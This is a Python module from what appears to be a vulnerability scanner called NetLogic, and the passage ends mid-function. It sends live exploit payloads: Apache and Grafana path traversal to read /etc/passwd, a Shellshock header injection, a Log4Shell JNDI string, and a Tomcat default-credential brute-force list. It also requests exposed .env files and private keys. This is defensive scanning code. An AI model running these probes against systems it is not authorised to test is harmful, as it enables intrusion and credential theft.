"""
NetLogic - CVE-Specific Vulnerability Prober
Safe, read-only active probes that attempt to confirm specific known vulnerabilities.
All probes are non-destructive and do not modify target state.
"""

import re
import socket
import base64
import ssl
import urllib.request
import urllib.error
from dataclasses import dataclass, field
from typing import Optional
from urllib.parse import urlparse


# ─── Data Models ─────────────────────────────────────────────────────────────

@dataclass
class CVEProbe:
    cve_id: str
    title: str
    severity: str       # CRITICAL / HIGH / MEDIUM / LOW
    confirmed: bool
    detail: str
    evidence: str = ""
    remediation: str = ""
    # Operator-facing reproduction (curl + expected signal). Always filled for
    # confirmed probes so executive / H1 summaries can ship a How-to-reproduce.
    poc: dict = field(default_factory=dict)

@dataclass
class VulnProbeResult:
    target: str
    probes_run: int = 0
    confirmed: list[CVEProbe] = field(default_factory=list)


# ─── Low-level Helpers ────────────────────────────────────────────────────────

def _normalize_host(host: str) -> str:
    """Lowercase host without port / trailing dot (for redirect comparisons)."""
    h = (host or "").strip().lower().rstrip(".")
    if not h:
        return ""
    # Strip brackets for IPv6 literals
    if h.startswith("[") and "]" in h:
        h = h[1:h.index("]")]
        return h
    # hostname:port (not IPv6)
    if h.count(":") == 1:
        h = h.rsplit(":", 1)[0]
    return h.rstrip(".")


def parse_location_host(location: str) -> str:
    """Hostname from a Location header, or '' if relative / unparseable."""
    loc = (location or "").strip()
    if not loc:
        return ""
    if loc.startswith("/") and not loc.startswith("//"):
        return ""
    if loc.startswith("//"):
        parsed = urlparse("https:" + loc)
    else:
        parsed = urlparse(loc)
        if not parsed.scheme:
            return ""
    return _normalize_host(parsed.hostname or "")


def hosts_same_site(a: str, b: str) -> bool:
    """True if hosts are equal or one is a subdomain of the other (www vs apex)."""
    ha, hb = _normalize_host(a), _normalize_host(b)
    if not ha or not hb:
        return False
    return ha == hb or ha.endswith("." + hb) or hb.endswith("." + ha)


def location_is_external(location: str, target_host: str) -> bool:
    """True when Location navigates the browser off the target site (host comparison only).

    Echoing an attacker URL inside a same-site Location *query* is NOT external:
    ``Location: https://www.zipenvy.com/cb?callbackUrl=https://evil.com`` stays on zipenvy.
    """
    loc_host = parse_location_host(location)
    if not loc_host:
        return False
    return not hosts_same_site(loc_host, target_host)


def is_external_open_redirect(location: str, target_host: str, marker: str) -> bool:
    """True only when Location sends the browser to an *external* host we control.

    CWE-601 requires the redirect *destination host* to leave the target origin.
    Same-site HTTP→HTTPS upgrades (or other redirects) that merely echo the probe
    marker in a query string are NOT open redirects — e.g.::

        Location: https://zipenvy.com/?url=https://netlogic-redirect-test.invalid
        Location: https://www.zipenvy.com/api/auth/callback?callbackUrl=https://evil.com

    Both keep the browser on the zipenvy site; only the query contains the external URL.
    """
    loc = (location or "").strip()
    if not loc or not marker:
        return False
    if not location_is_external(loc, target_host):
        return False
    loc_host = parse_location_host(loc)
    # Probe control: destination host must be our marker domain (not just "marker in URL").
    return marker.lower() in loc_host


def http_poc(host: str, port: int, scheme: str, path: str, expected: str,
             method: str = "GET") -> dict:
    """Build a deterministic non-destructive operator PoC dict."""
    p = path if (path or "").startswith("/") else f"/{path or ''}"
    # Default port omission for cleaner curls
    if (scheme == "https" and int(port) == 443) or (scheme == "http" and int(port) == 80):
        base = f"{scheme}://{host}{p}"
    else:
        base = f"{scheme}://{host}:{port}{p}"
    curl = f"curl -sk -D- -o /dev/null -X {method} '{base}'"
    return {
        "curl": curl,
        "expected": (expected or "")[:400],
        "how_to_reproduce": (
            f"1. Run the curl below (read-only; does not modify the target).\n"
            f"2. Confirm the vulnerable signal: {(expected or '')[:240]}\n"
            f"3. Safe response: no such signal / redirect stays on `{host}`."
        ),
    }


def ensure_probe_poc(probe: "CVEProbe", host: str, port: int, scheme: str) -> "CVEProbe":
    """Fill ``probe.poc`` from evidence when missing (path extracted from evidence)."""
    if probe.poc and probe.poc.get("curl"):
        return probe
    method, path = "GET", "/"
    ev = probe.evidence or ""
    m = re.search(r"\b(GET|POST|HEAD|PUT|OPTIONS)\s+(\S+)", ev, re.I)
    if m:
        method, path = m.group(1).upper(), m.group(2)
        # Strip trailing punctuation from path tokens
        path = path.rstrip(".,;→")
    probe.poc = http_poc(host, port, scheme, path, expected=ev or probe.detail, method=method)
    return probe


def _raw_http(host: str, port: int, request_bytes: bytes,
              timeout: float = 5.0, max_recv: int = 16384) -> Optional[str]:
    """Send a raw HTTP request and return the response as a string."""
    try:
        with socket.create_connection((host, port), timeout=timeout) as sock:
            sock.sendall(request_bytes)
            sock.settimeout(timeout)
            chunks = []
            total = 0
            while total < max_recv:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    chunks.append(chunk)
                    total += len(chunk)
                except socket.timeout:
                    break
            return b"".join(chunks).decode("utf-8", errors="replace")
    except Exception:
        return None


def _http_get(host: str, port: int, path: str, scheme: str = "http",
              timeout: float = 5.0, headers: dict = None) -> tuple[Optional[int], Optional[str]]:
    """Simple HTTP GET returning (status_code, body) or (None, None).
    Checks the active CDN/edge block baseline: if the response matches the
    baseline fingerprint, returns (-1, "") so callers skip it."""
    try:
        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        url = f"{scheme}://{host}:{port}{path}"
        req = urllib.request.Request(url, headers=headers or {})
        with urllib.request.urlopen(req, timeout=timeout, context=ctx) as resp:
            status, body = resp.status, resp.read(16384).decode("utf-8", errors="replace")
    except urllib.error.HTTPError as e:
        try:
            body = e.read(4096).decode("utf-8", errors="replace")
        except Exception:
            body = ""
        status = e.code
    except Exception:
        return None, None
    return _baseline_filter(status, body)


# ── CDN/Edge block baseline ────────────────────────────────────────────────
# Thread-local (well, module-level — probes run sequentially per port) baseline
# fingerprint. Set by probe_web_vulnerabilities() before running per-port probes;
# _http_get checks every response against it and returns (-1, "") on match so
# the caller treats it as a non-response rather than a confirmed finding.

_BASELINE: Optional[dict] = None


def _compute_baseline(host: str, port: int, scheme: str = "http",
                      timeout: float = 5.0) -> Optional[dict]:
    """Send GET to a random path and return a fingerprint. Returns None if
    the target is unreachable (no baseline = not blocked)."""
    from src.service_prober import _response_baseline as _rb
    return _rb(host, port, scheme=scheme, timeout=timeout)


def _baseline_filter(status: Optional[int], body: Optional[str]) -> tuple[Optional[int], Optional[str]]:
    """Check a probe response against the active baseline. If it matches, return
    (-1, "") so the probe treats it as unreachable rather than a confirmed finding."""
    global _BASELINE
    if _BASELINE is None or status is None:
        return status, body
    from src.service_prober import _is_baseline_block as _ibb
    body_str = body or ""
    if _ibb(_BASELINE, status, body_str, None):
        return -1, ""
    return status, body


# ─── CVE-Specific Probes ─────────────────────────────────────────────────────

def probe_apache_path_traversal(host: str, port: int, scheme: str = "http",
                                 timeout: float = 5.0) -> Optional[CVEProbe]:
    """
    CVE-2021-41773 / CVE-2021-42013 — Apache HTTP Server 2.4.49/2.4.50
    Unauthenticated path traversal and remote code execution via mod_cgi.
    """
    # CVE-2021-41773: single %2e encoding
    path1 = "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"
    req1 = (f"GET {path1} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n").encode()
    resp1 = _raw_http(host, port, req1, timeout=timeout)
    if resp1 and "root:" in resp1 and ("/bin/" in resp1 or "nologin" in resp1 or "daemon:" in resp1):
        return CVEProbe(
            cve_id="CVE-2021-41773",
            title="Apache 2.4.49 Path Traversal — /etc/passwd Retrieved",
            severity="CRITICAL", confirmed=True,
            detail=("Apache 2.4.49 path traversal confirmed. "
                    "/etc/passwd is readable via single-encoded dot-segment bypass. "
                    "If mod_cgi is enabled, this escalates to unauthenticated RCE (CVSS 9.8)."),
            evidence=f"GET {path1} → HTTP 200 with /etc/passwd content",
            remediation="Upgrade Apache to 2.4.51+; set 'Require all denied' in <Directory />; disable mod_cgi."
        )

    # CVE-2021-42013: double encoding (%%32%65)
    path2 = "/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/etc/passwd"
    req2 = (f"GET {path2} HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n").encode()
    resp2 = _raw_http(host, port, req2, timeout=timeout)
    if resp2 and "root:" in resp2 and ("/bin/" in resp2 or "nologin" in resp2):
        return CVEProbe(
            cve_id="CVE-2021-42013",
            title="Apache 2.4.50 Path Traversal (Double Encoding)",
            severity="CRITICAL", confirmed=True,
            detail="Apache 2.4.50 double-encoded path traversal confirmed. /etc/passwd retrieved. RCE via mod_cgi.",
            evidence=f"GET {path2} → HTTP 200 with /etc/passwd content",
            remediation="Upgrade Apache to 2.4.51+."
        )
    return None


def probe_grafana_path_traversal(host: str, port: int, scheme: str = "http",
                                  timeout: float = 5.0) -> Optional[CVEProbe]:
    """CVE-2021-43798 — Grafana 8.x plugin directory traversal."""
    plugins = ["alertlist", "graph", "table", "stat", "piechart", "barchart",
               "timeseries", "gauge", "text", "dashlist"]
    for plugin in plugins:
        path = f"/public/plugins/{plugin}/../../../../../../../etc/passwd"
        status, body = _http_get(host, port, path, scheme=scheme, timeout=timeout)
        if status == 200 and body and "root:" in body:
            return CVEProbe(
                cve_id="CVE-2021-43798",
                title="Grafana Plugin Directory Traversal",
                severity="HIGH", confirmed=True,
                detail=(f"Grafana CVE-2021-43798 confirmed via plugin '{plugin}'. "
                        "/etc/passwd retrieved. Affects Grafana 8.0.0–8.3.0. "
                        "Grafana.ini (with DB passwords) may also be readable."),
                evidence=f"GET /public/plugins/{plugin}/../../.../etc/passwd → HTTP 200 with passwd content",
                remediation="Upgrade Grafana to 8.3.1+; restrict network access to Grafana management port."
            )
    return None


def probe_shellshock(host: str, port: int, scheme: str = "http",
                     timeout: float = 5.0) -> Optional[CVEProbe]:
    """CVE-2014-6271 — Shellshock: bash CGI remote code execution via environment injection."""
    cgi_paths = [
        "/cgi-bin/test.cgi", "/cgi-bin/printenv", "/cgi-bin/test-cgi",
        "/cgi-bin/status", "/cgi-bin/env", "/cgi-bin/index.cgi",
        "/cgi-bin/bash", "/cgi-bin/run.cgi",
    ]
    payload = "() { :;}; echo; echo; echo NETLOGIC_SHELLSHOCK_CONFIRMED"
    for path in cgi_paths:
        req = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host}\r\n"
            f"User-Agent: {payload}\r\n"
            f"Referer: {payload}\r\n"
            f"Cookie: x={payload}\r\n"
            f"Connection: close\r\n\r\n"
        ).encode()
        resp = _raw_http(host, port, req, timeout=timeout)
        if resp and "NETLOGIC_SHELLSHOCK_CONFIRMED" in resp:
            return CVEProbe(
                cve_id="CVE-2014-6271",
                title="Shellshock — Bash CGI Remote Code Execution",
                severity="CRITICAL", confirmed=True,
                detail=(f"Shellshock confirmed at {path}. "
                        "Bash function definition in HTTP headers executes arbitrary commands. "
                        "Full unauthenticated OS command execution as the web server user."),
                evidence=f"GET {path} with Shellshock payload in User-Agent → 'NETLOGIC_SHELLSHOCK_CONFIRMED' in response",
                remediation="Update bash to a patched version (>= 4.3-patch 25); disable CGI scripts; upgrade OS."
            )
    return None


def probe_spring_actuator(host: str, port: int, scheme: str = "http",
                           timeout: float = 4.0) -> list[CVEProbe]:
    """Spring Boot actuator endpoint exposure — information disclosure and potential RCE."""
    probes = []
    endpoints = [
        ("/actuator/env",      "CRITICAL", "Spring Boot /actuator/env — Credentials in Environment",
         "All environment variables, Spring properties, and system properties exposed. "
         "Often contains database URLs with credentials, API keys, and JWT secrets."),
        ("/actuator/heapdump", "CRITICAL", "Spring Boot /actuator/heapdump — JVM Memory Dump",
         "JVM heap dump accessible for download. Memory analysis reveals credentials, "
         "session tokens, cryptographic keys, and sensitive business data."),
        ("/actuator/httptrace","MEDIUM",   "Spring Boot /actuator/httptrace — HTTP Request History",
         "Recent HTTP request/response pairs exposed including Authorization headers and cookies."),
        ("/actuator/mappings", "MEDIUM",   "Spring Boot /actuator/mappings — Full Route Map",
         "All application routes, controllers, and handler methods enumerated. "
         "Aids targeted attack planning against internal endpoints."),
        ("/actuator/beans",    "LOW",      "Spring Boot /actuator/beans — Bean Configuration",
         "Spring application context bean wiring and component configuration exposed."),
        ("/actuator/loggers",  "MEDIUM",   "Spring Boot /actuator/loggers — Log Level Control",
         "Actuator loggers endpoint may allow changing log verbosity to capture credentials in logs."),
    ]
    for path, severity, title, detail in endpoints:
        status, body = _http_get(host, port, path, scheme=scheme, timeout=timeout)
        if status == 200 and body and len(body.strip()) > 5:
            probes.append(CVEProbe(
                cve_id="CWE-215",
                title=title, severity=severity, confirmed=True,
                detail=detail,
                evidence=f"GET {path} → HTTP 200 ({len(body)} bytes)",
                remediation=("Disable actuator endpoints in production: "
                             "management.endpoints.enabled-by-default=false; "
                             "require authentication; restrict to admin networks only.")
            ))
    return probes


def probe_php_info_exposure(host: str, port: int, scheme: str = "http",
                             timeout: float = 4.0) -> list[CVEProbe]:
    """PHP information disclosure — phpinfo() and debug pages."""
    findings = []
    paths = [
        ("/phpinfo.php", "phpinfo()"),
        ("/info.php",    "phpinfo() (info.php)"),
        ("/php-info.php","phpinfo() (php-info.php)"),
        ("/test.php",    "PHP Test File"),
        ("/php.php",     "PHP Info (php.php)"),
    ]
    for path, label in paths:
        status, body = _http_get(host, port, path, scheme=scheme, timeout=timeout)
        if status == 200 and body and "PHP Version" in body and "<table" in body:
            findings.append(CVEProbe(
                cve_id="CWE-200",
                title=f"{label} Exposed at {path}",
                severity="MEDIUM", confirmed=True,
                detail=(f"phpinfo() output accessible at {path}. Exposes PHP version, "
                        "loaded extensions, file paths, environment variables, and full server configuration. "
                        "Aids targeted exploit selection."),
                evidence=f"GET {path} → HTTP 200 with phpinfo() table output",
                remediation=f"Delete {path} from production server; never deploy debug pages to production."
            ))
    return findings


def probe_backup_files(host: str, port: int, scheme: str = "http",
                       timeout: float = 4.0) -> list[CVEProbe]:
    """Detect publicly accessible backup and configuration files containing credentials."""
    findings = []
    targets = [
        ("/.env",                 "Environment File",           "CRITICAL", ["PASSWORD", "SECRET", "KEY", "TOKEN", "DB_"]),
        ("/.env.backup",          "Backup Env File (.backup)",  "CRITICAL", ["PASSWORD", "SECRET", "DB_"]),
        ("/.env.old",             "Old Env File (.old)",        "CRITICAL", ["PASSWORD", "SECRET", "DB_"]),
        ("/.env.production",      "Production Env File",        "CRITICAL", ["PASSWORD", "SECRET", "DB_"]),
        ("/wp-config.php.bak",    "WordPress Config Backup",    "CRITICAL", ["DB_PASSWORD", "AUTH_KEY", "DB_HOST"]),
        ("/wp-config.php~",       "WordPress Config (tilde)",   "CRITICAL", ["DB_PASSWORD", "AUTH_KEY"]),
        ("/config.php.bak",       "PHP Config Backup",          "HIGH",     ["password", "db_", "mysql", "pgsql"]),
        ("/database.yml",         "Rails Database Config",      "HIGH",     ["password:", "adapter:", "username:"]),
        ("/config/database.yml",  "Rails DB Config (config/)",  "HIGH",     ["password:", "adapter:"]),
        ("/application.properties","Spring Properties",         "HIGH",     ["password", "datasource", "secret"]),
        ("/application.yml",      "Spring Config YAML",         "HIGH",     ["password", "datasource", "secret"]),
        ("/settings.py",          "Django Settings",            "HIGH",     ["SECRET_KEY", "PASSWORD", "DATABASE"]),
        ("/local_settings.py",    "Django Local Settings",      "HIGH",     ["SECRET_KEY", "PASSWORD"]),
        ("/web.config.bak",       "IIS Web.config Backup",      "HIGH",     ["password", "connectionString"]),
        ("/config.bak",           "Config Backup",              "HIGH",     ["password", "secret", "key"]),
        ("/id_rsa",               "Private SSH Key",            "CRITICAL", ["BEGIN", "PRIVATE KEY", "OPENSSH"]),
        ("/id_dsa",               "Private SSH Key (DSA)",      "CRITICAL", ["BEGIN", "PRIVATE KEY"]),
        ("/server.key",           "TLS Private Key",            "CRITICAL", ["BEGIN", "PRIVATE KEY"]),
        ("/private.key",          "Private Key File",           "CRITICAL", ["BEGIN", "PRIVATE KEY"]),
    ]
    for path, label, base_sev, keywords in targets:
        status, body = _http_get(host, port, path, scheme=scheme, timeout=timeout)
        if status != 200 or not body:
            continue
        body_lower = body.lower()
        found_kws = [kw for kw in keywords if kw.lower() in body_lower]
        if not found_kws:
            continue  # Exists but no recognizable secrets — skip to avoid false positives
        findings.append(CVEProbe(
            cve_id="CWE-200",
            title=f"{label} — Credentials Exposed",
            severity=base_sev, confirmed=True,
            detail=(f"{label} is publicly accessible and contains sensitive keywords: "
                    f"{', '.join(found_kws[:4])}. Credentials or secrets may be directly readable."),
            evidence=f"GET {path} → HTTP 200 ({len(body)} bytes); keywords: {', '.join(found_kws[:3])}",
            remediation=f"Remove {path} from web root; use secret management (Vault, AWS Secrets Manager); "
                        "add deny rules in web server config; scan for other exposed files."
        ))
    return findings


def probe_tomcat_default_creds(host: str, port: int, timeout: float = 5.0) -> Optional[CVEProbe]:
    """Apache Tomcat manager — default/weak credential brute-force."""
    # First check if manager exists
    status, body = _http_get(host, port, "/manager/html", timeout=timeout)
    if status not in (200, 401):
        return None
    if status == 200:
        return CVEProbe(
            cve_id="CWE-306",
            title="Tomcat Manager — Unauthenticated Access",
            severity="CRITICAL", confirmed=True,
            detail="Apache Tomcat manager (/manager/html) accessible without any authentication. "
                   "WAR file deployment capability = arbitrary code execution on the server.",
            evidence="GET /manager/html → HTTP 200 (no authentication required)",
            remediation="Require authentication for Tomcat manager; restrict to 127.0.0.1; remove manager from production."
        )
    if status == 401:
        default_creds = [
            ("admin", "admin"), ("tomcat", "tomcat"), ("tomcat", "s3cret"),
            ("admin", ""), ("root", "root"), ("admin", "tomcat"),
            ("manager", "manager"), ("admin", "password"), ("both", "tomcat"),
        ]
        for username, password in default_creds:
            cred_b64 = base64.b64encode(f"{username}:{password}".encode()).decode()
            s, b = _http_get(host, port, "/manager/html", timeout=timeout,
                             headers={"Authorization": f"Basic {cred_b64}"})
            if s == 200:
                return CVEProbe(
                    cve_id="CWE-521",
                    title=f"Tomcat Manager — Default Credentials ({username}:{password or '<empty>'})",
                    severity="CRITICAL", confirmed=True,
                    detail=(f"Tomcat manager authenticated with default credentials {username}:{password or '<empty>'}. "
                            "Arbitrary WAR deployment = full server code execution as the Tomcat service user."),
                    evidence=f"GET /manager/html with {username}:{password or '<empty>'} → HTTP 200",
                    remediation="Change all Tomcat manager credentials; restrict manager access to admin IPs; "
                                "consider removing manager webapp from production."
                )
    return None


def probe_open_redirect(host: str, port: int, scheme: str = "http",
                        timeout: float = 4.0) -> Optional[CVEProbe]:
    """CWE-601: Open redirect — attacker-controlled *external* redirect destination.

    Confirms only when the Location **host** is external to the target AND is the
    probe marker domain. Marker text merely reflected into a same-site Location
    query string is a false positive (common on HTTPS upgrade / canonical redirects).
    """
    marker = "netlogic-redirect-test.invalid"
    test_paths = [
        f"/?url=https://{marker}", f"/?redirect=https://{marker}",
        f"/?next=https://{marker}", f"/?return=https://{marker}",
        f"/?returnUrl=https://{marker}", f"/?goto=https://{marker}",
        f"/?back=https://{marker}", f"/?target=https://{marker}",
        f"/redirect?url=https://{marker}", f"/out?url=https://{marker}",
        f"/login?next=https://{marker}",
    ]

    class _NoRedirect(urllib.request.HTTPRedirectHandler):
        def redirect_request(self, req, fp, code, msg, headers, newurl):
            return None

    opener = urllib.request.build_opener(_NoRedirect)

    for path in test_paths:
        try:
            url = f"{scheme}://{host}:{port}{path}"
            req = urllib.request.Request(url)
            location = None
            resp_code = None
            try:
                resp = opener.open(req, timeout=timeout)
                resp_code = resp.status
                location = resp.headers.get("location", "") or resp.headers.get("Location", "")
            except urllib.error.HTTPError as e:
                resp_code = e.code
                location = e.headers.get("location", "") or e.headers.get("Location", "")
            if resp_code not in (301, 302, 303, 307, 308) or not location:
                continue
            if not is_external_open_redirect(location, host, marker):
                continue
            expected = (
                f"HTTP {resp_code} with Location host = {marker} "
                f"(observed Location: {location[:120]})"
            )
            return CVEProbe(
                cve_id="CWE-601",
                title="Open Redirect — Attacker-Controlled Location Header",
                severity="MEDIUM", confirmed=True,
                detail=(f"Open redirect confirmed at {path}. Server redirects the browser to an "
                        "external host controlled by the attacker parameter. Used in phishing — "
                        "links from your trusted domain land on a malicious site."),
                evidence=f"GET {path} → HTTP {resp_code} Location: {location[:120]}",
                remediation="Validate redirect destinations against an allowlist; use relative paths only; "
                            "display interstitial warning for external redirects.",
                poc=http_poc(host, port, scheme, path, expected=expected),
            )
        except Exception:
            continue
    return None


def probe_ghostcat(host: str, port: int = 8009, timeout: float = 5.0) -> Optional[CVEProbe]:
    """CVE-2020-1938 — Apache Tomcat AJP 'Ghostcat' connector exposure."""
    # Send AJP CPING (type 0x0A) and look for CPONG response (type 0x09)
    ajp_cping = b"\x12\x34\x00\x01\x0a"  # Magic(2) + Length(2) + CPING(1)
    try:
        with socket.create_connection((host, port), timeout=timeout) as sock:
            sock.sendall(ajp_cping)
            sock.settimeout(timeout)
            resp = sock.recv(16)
        # AJP responses start with 0x41 0x42 ('AB')
        if resp and len(resp) >= 4 and resp[:2] == b"\x41\x42":
            return CVEProbe(
                cve_id="CVE-2020-1938",
                title="Ghostcat — Apache Tomcat AJP Connector Exposed",
                severity="HIGH", confirmed=True,
                detail=("Tomcat AJP connector is accessible on port 8009 (CPONG received). "
                        "CVE-2020-1938 allows unauthenticated file read from any location within the web app "
                        "(e.g. /WEB-INF/web.xml, application.properties). "
                        "If file upload is possible on the target, this escalates to RCE."),
                evidence=f"AJP CPING on port {port} received valid CPONG response (0x41 0x42)",
                remediation="Upgrade Tomcat to 9.0.31+/8.5.51+/7.0.100+; "
                            "disable AJP connector if unused (Connector port='-1'); "
                            "set 'secret' attribute on AJP connector if AJP is required."
            )
    except Exception:
        pass
    return None


def probe_directory_listing(host: str, port: int, scheme: str = "http",
                             timeout: float = 4.0) -> Optional[CVEProbe]:
    """CWE-548: Directory listing enabled — file structure exposed."""
    test_paths = ["/", "/static/", "/assets/", "/upload/", "/uploads/",
                  "/images/", "/files/", "/backup/", "/data/", "/logs/"]
    for path in test_paths:
        status, body = _http_get(host, port, path, scheme=scheme, timeout=timeout)
        if status == 200 and body:
            if any(sig in body for sig in ("Index of ", "<title>Index of", "Directory listing",
                                            "Parent Directory", "[DIR]", "[PARENTDIR]")):
                return CVEProbe(
                    cve_id="CWE-548",
                    title=f"Directory Listing Enabled — {path}",
                    severity="MEDIUM", confirmed=True,
                    detail=(f"Web server has directory listing enabled at {path}. "
                            "File structure and potentially sensitive files (backups, configs, logs) "
                            "are directly browsable and downloadable."),
                    evidence=f"GET {path} → HTTP 200 with directory index page",
                    remediation="Disable directory listing (Options -Indexes in Apache; "
                                "autoindex off; in Nginx); add index.html to all directories."
                )
    return None


def probe_nginx_alias_traversal(host: str, port: int, scheme: str = "http",
                                 timeout: float = 4.0) -> Optional[CVEProbe]:
    """
    Nginx off-by-one alias traversal — misconfigured location blocks
    allow reading files one directory above the intended static root.
    """
    # Common alias traversal paths
    test_cases = [
        ("/static../etc/passwd",   "/static"),
        ("/assets../etc/passwd",   "/assets"),
        ("/files../etc/passwd",    "/files"),
        ("/media../etc/passwd",    "/media"),
        ("/uploads../etc/passwd",  "/uploads"),
        ("/js../etc/passwd",       "/js"),
        ("/css../etc/passwd",      "/css"),
    ]
    for path, prefix in test_cases:
        # First verify the prefix exists
        check_status, _ = _http_get(host, port, prefix + "/", scheme=scheme, timeout=timeout)
        if check_status == 404:
            continue
        status, body = _http_get(host, port, path, scheme=scheme, timeout=timeout)
        if status == 200 and body and "root:" in body and ("/bin/" in body or "nologin" in body):
            return CVEProbe(
                cve_id="CWE-22",
                title=f"Nginx Alias Traversal — /etc/passwd via {path}",
                severity="HIGH", confirmed=True,
                detail=(f"Nginx alias traversal confirmed at {path}. "
                        "Misconfigured 'alias' directive allows reading files outside the intended directory. "
                        "/etc/passwd retrieved; server-side code and configs may also be accessible."),
                evidence=f"GET {path} → HTTP 200 with /etc/passwd content",
                remediation="Ensure location blocks end with '/' when using alias: "
                            "'location /static/ { alias /var/www/static/; }' — "
                            "missing trailing slash on location causes the traversal."
            )
    return None


def probe_log4shell_headers(host: str, port: int, scheme: str = "http",
                             timeout: float = 4.0) -> Optional[CVEProbe]:
    """
    CVE-2021-44228 — Log4Shell passive detection via response behavior.
    Injects JNDI strings into common headers and checks for error responses
    that indicate Log4j processing (no DNS callback infrastructure needed).
    """
    # A safe JNDI string that will fail gracefully but trigger Log4j processing
    # Using a non-resolving domain so no actual exfiltration occurs
    jndi_payload = "${jndi:ldap://log4shell-test.invalid/a}"
    headers = {
        "X-Api-Version": jndi_payload,
        "User-Agent":    f"Mozilla/5.0 {jndi_payload}",
        "X-Forwarded-For": jndi_payload,
        "Referer":       f"https://example.com/{jndi_payload}",
    }
    log4j_paths = ["/", "/api", "/search", "/form-handler", "/contact", "/login", "/admin"]
    java_error_indicators = [
        "javax.naming.CommunicationException",
        "com.sun.jndi.ldap",
        "log4j",
        "java.lang.reflect",
        "NamingException",
    ]
    for path in log4j_paths:
        status, body = _http_get(host, port, path, scheme=scheme, timeout=timeout, headers=headers)
        if status is None:
            continue
        if body and any(ind in body for ind in java_error_indicators):
            return CVEProbe(
            cve_id="CVE-2021-44228",
            title="Log4Shell — Possible Log4j JNDI Processing (Error Leakage)",
            severity="CRITICAL", confirmed=False,
            detail=("Java/JNDI error strings visible in HTTP response after injecting JNDI payload headers. "
                    "Indicates Log4j may be processing user-supplied strings. "
                    "Full confirmation requires DNS callback infrastructure."),
            evidence=f"Java error indicators in response to JNDI-containing headers",
            remediation="Upgrade Log4j to 2.17.1+ (Java 8) or 2.12.4+ (Java 7); "
                        "set log4j2.formatMsgNoLookups=true; block outbound LDAP/RMI at network level."
        )
    return None


def probe_iis_shortname(host: str, port: int, scheme: str = "http",
                         timeout: float = 4.0) -> Optional[CVEProbe]:
    """CVE-2010-2730 / IIS Tilde Enumeration — 8.3 filename disclosure."""
    # Try the classic tilde enumeration request — different response codes indicate vulnerable
    req = f"GET /~1/ HTTP/1.1\r\nHost: {host}\r\nConnection: close\r\n\r\n"
    resp = _raw_http(host, port, req.encode(), timeout=timeout)
    if not resp:
        return None
    def _status_line(r):
        first = r.split("\r\n", 1)[0]
        parts = first.split(None, 2)
        return parts[1] if len(parts) >= 2 and parts[1].isdigit() else None

    is_iis = ("IIS" in resp or "X-Powered-By: ASP" in resp)
    tilde_status = _status_line(resp)
    # The tilde-enumeration signal is a DIVERGENCE: a tilde path and a random
    # invalid path must return *different* status codes. If both return the same
    # code (e.g. 404 for everything — the normal/secure case) there is no leak.
    if is_iis and tilde_status:
        resp2_raw = _raw_http(host, port,
                              b"GET /netlogic-nonexistent-xyz123/ HTTP/1.1\r\nHost: " + host.encode() + b"\r\nConnection: close\r\n\r\n",
                              timeout=timeout)
        invalid_status = _status_line(resp2_raw) if resp2_raw else None
        if invalid_status and tilde_status != invalid_status:
            return CVEProbe(
                cve_id="CVE-2010-2730",
                title="IIS Tilde Enumeration — 8.3 Filename Disclosure",
                severity="LOW", confirmed=False,
                detail=("IIS detected with tilde-sensitive 404 responses. "
                        "IIS 8.3 short filename enumeration may be possible, "
                        "allowing discovery of hidden files and directories."),
                evidence=f"GET /~1/ → HTTP {tilde_status} vs invalid path → HTTP {invalid_status} (IIS tilde divergence)",
                remediation="Disable short filename creation: fsutil 8dot3name set <drive> 1; "
                            "configure IIS to return 404 for all invalid paths uniformly."
            )
    return None


# ─── Main Entry ──────────────────────────────────────────────────────────────

_SEV_ORDER = {"CRITICAL": 0, "HIGH": 1, "MEDIUM": 2, "LOW": 3, "INFO": 4}

_HTTP_SERVICES = {
    "http", "https", "http-alt", "https-alt",
    "grafana", "kibana", "prometheus", "vault", "consul-http",
}


def probe_web_vulnerabilities(target: str, ports: list,
                               timeout: float = 5.0) -> VulnProbeResult:
    """
    Run CVE-specific vulnerability probes against discovered HTTP services.
    `ports` is a list of PortResult objects from scanner.py.
    """
    global _BASELINE
    result = VulnProbeResult(target=target)
    all_port_nums = {p.port for p in ports}

    http_ports = [p for p in ports if p.service in _HTTP_SERVICES or
                  p.port in (80, 443, 8080, 8443, 8000, 8001, 8008, 3000, 5601)]

    if not http_ports and not (8009 in all_port_nums):
        return result

    for port_result in http_ports:
        port = port_result.port
        scheme = "https" if (port_result.tls or port in (443, 8443, 8444)) else "http"

        result.probes_run += 1

        # ── CDN/edge block baseline ──────────────────────────────────────
        # Send a random-path probe first. If every subsequent probe returns
        # the same block-page response, all findings for this port are FPs.
        _BASELINE = _compute_baseline(target, port, scheme=scheme, timeout=timeout)

        # Universal HTTP probes — run on every HTTP port
        def _add(p):
            if p:
                result.confirmed.append(ensure_probe_poc(p, target, port, scheme))

        listing = probe_directory_listing(target, port, scheme=scheme, timeout=timeout)
        _add(listing)

        for probe in probe_php_info_exposure(target, port, scheme=scheme, timeout=timeout):
            _add(probe)

        redirect = probe_open_redirect(target, port, scheme=scheme, timeout=timeout)
        _add(redirect)

        _add(probe_log4shell_headers(target, port, scheme=scheme, timeout=timeout))
        _add(probe_nginx_alias_traversal(target, port, scheme=scheme, timeout=timeout))
        _add(probe_iis_shortname(target, port, scheme=scheme, timeout=timeout))

        # Service / port specific probes
        svc = port_result.service or ""

        # Apache path traversal
        if svc in ("http", "https", "http-alt", "https-alt") or port in (80, 443, 8080, 8443):
            _add(probe_apache_path_traversal(target, port, scheme=scheme, timeout=timeout))
            _add(probe_shellshock(target, port, scheme=scheme, timeout=timeout))

        # Spring Boot actuator
        if port in (8080, 8443, 8000, 8001, 8008, 8888) or svc in ("http-alt", "https-alt"):
            for probe in probe_spring_actuator(target, port, scheme=scheme, timeout=timeout):
                _add(probe)
            _add(probe_tomcat_default_creds(target, port, timeout=timeout))

        # Grafana
        if svc == "grafana" or port == 3000:
            _add(probe_grafana_path_traversal(target, port, scheme=scheme, timeout=timeout))

        _BASELINE = None  # clear baseline after per-port probes

    # Ghostcat — check AJP port 8009 if found, or try if Tomcat ports exist
